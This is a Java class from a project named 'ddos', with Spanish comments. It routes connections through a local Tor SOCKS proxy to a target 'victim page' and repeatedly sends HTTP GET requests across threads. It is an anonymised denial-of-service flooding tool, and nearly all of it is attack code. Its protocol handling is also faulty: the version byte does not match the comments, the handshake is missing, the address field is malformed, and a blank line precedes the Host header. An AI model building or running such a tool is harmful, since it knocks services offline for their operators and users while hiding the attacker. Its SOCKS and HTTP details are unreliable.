/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package ddos;

import static ddos.ddosObject.TorSocket;
import static ddos.ddosObject.proxyAddr;
import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author emanlui
 */
public class Socks5 extends Thread{
    
   
    private String targetHostname;
    private int cantidadHilos;
    
    static int proxyPort = 9050;    // Puerto tor por defecto
	
    static String proxyAddr = "localhost";   // 127.0.0.1
	
    final static byte CD = (byte) 0x01; // Este byte le dice al socket que se conecte, 0x02 para que haya un binding
	
    final static byte TOR_RESOLVE = (byte) 0xF0;   // Este byte permite al socket resolver consultas con el dns de tor
	
    final static byte VN = (byte) 0x05;     // Byte que permite ver si los sockets son SOCKS4 o SOCKS4a
	
    final static byte SOCKS_DELIM = (byte) 0x00;    // Delimitador nulo necesario para terminar el socket

    final static int SOCKS4A_FAKEIP = (int) 0x01;    // Byte que permite al socket habilitarse, se setea con el campo 0.0.0.1
	
    final static int IPV4 = (int) 0x01;

    Socks5(int cantidadHilos, String url) {
        this.cantidadHilos = cantidadHilos;
        this.targetHostname = url;
    }
 
    
    /**
         * @brief Configura el socket manualmente con los bytes, hay que notar que es SOCKS4a no SOCKS4
         * @param targetHostname Pagina victima
         * @param targetPort Puerto 80 por defecto
         * @param connectByte Byte que le dice al socket que se conecte
         * @return El socket configurado correctamente
         * @throws IOException 
         */
    
        public Socket TorSocketPre(String targetHostname, int targetPort, byte connectByte) 
	throws IOException {
	
		Socket s;
		System.out.println("Abriendo coneccion a "+targetHostname+":"+targetPort+
				" via proxy "+proxyAddr+":"+proxyPort+" de tipo "+connectByte);
		s = new Socket(proxyAddr, proxyPort);
                System.out.println("El socket se creo exitosamente");
		DataOutputStream os = new DataOutputStream(s.getOutputStream());
		os.writeByte(VN);
		os.writeByte(CD);
                os.writeByte(SOCKS_DELIM);
                os.writeByte(IPV4);
                os.writeBytes(1 + targetHostname);
		os.writeShort(targetPort);
		System.out.println("Socket configurado correctamente");
		return(s);
	}

	/**
         * @brief Sirve para instanciar un socket e imprimir si se creo correctamente o hay un error 
         * @param targetHostname Pagina victima
         * @param targetPort Puerto 80 por defecto
         * @return Retorna el socket configurado
         * @throws IOException 
         */
	public Socket TorSocket(String targetHostname, int targetPort) 
	throws IOException {
		Socket s = TorSocketPre(targetHostname,targetPort,CD);
		DataInputStream is = new DataInputStream(s.getInputStream());


		byte version = is.readByte();
		byte status = is.readByte();
                System.out.println("Imprimiendo estado del socket...");
		if(status != (byte)0) {		
			throw(new IOException(SockError(status)));
		}
                System.out.println("status: "+SockError(status));
		
                
                
		return(s);
	}
        
        /**
         * @brief Segun los errores especificados en la pagina de los sockets, se va haciendo un case con sus respectivos casos 
         * @param status El estado del socket
         * @return Un string que devuelve el numero del error y la descripcion
         */
	public String SockError(byte status) {
		
		String error;
		switch(status) {
		case 0:  
			error = status+" petición concedida.";
			break;
		case 1:
			error = status+" fallo general.";
			break;
		case 2:
			error = status+" la conexión no se permitió por el conjunto de reglas(ruleset).";
			break;
		case 3:
			error = status+" red inalcanzable.";
			break;
                case 4:
			error = status+" host inalcanzable.";
			break;
                case 5:
			error = status+" conexión rechazada por el host destino.";
			break;
                case 6:
			error = status+" TTL expirado.";
			break;
                case 7:
			error = status+" comando no soportado/ error de protocolo.";
			break;
                case 8:
			error = status+" tipo de dirección no soportado.";
			break;
		default:
			error = status+" Unknown SOCKS status code.";									
		}
		return(error);
		
	}

         /**
         * @brief Sirve para poder imprimir el GET de la pagina atacada
         * @param s Es el socket utilizado para el GET
         * @throws IOException 
         */
        public void llamarGet(Socket s) throws IOException{
              
		PrintWriter pw = new PrintWriter(s.getOutputStream());
		pw.println("GET / HTTP/1.1");
		pw.println("");
		pw.println("Host: " + targetHostname);
		pw.flush();
		BufferedReader br = new BufferedReader(new InputStreamReader(s.getInputStream()));
		String t;
		while((t = br.readLine()) != null) System.out.println(t);
		br.close();
	}
        
        /**
     * @brief Es el run de los threads, se llama en la clase DdosClass
     * @throws java.io.IOException
     */
    
    public void run() {
        
	
	int targetPort = 80;
        
            try {
                for(int i = 0; i< cantidadHilos; i++){
                    Socket s = TorSocket(targetHostname, targetPort);
                    llamarGet(s);
                }
                
            } catch (IOException ex) {
                Logger.getLogger(ddosObject.class.getName()).log(Level.SEVERE, null, ex);
            }
    }

    
}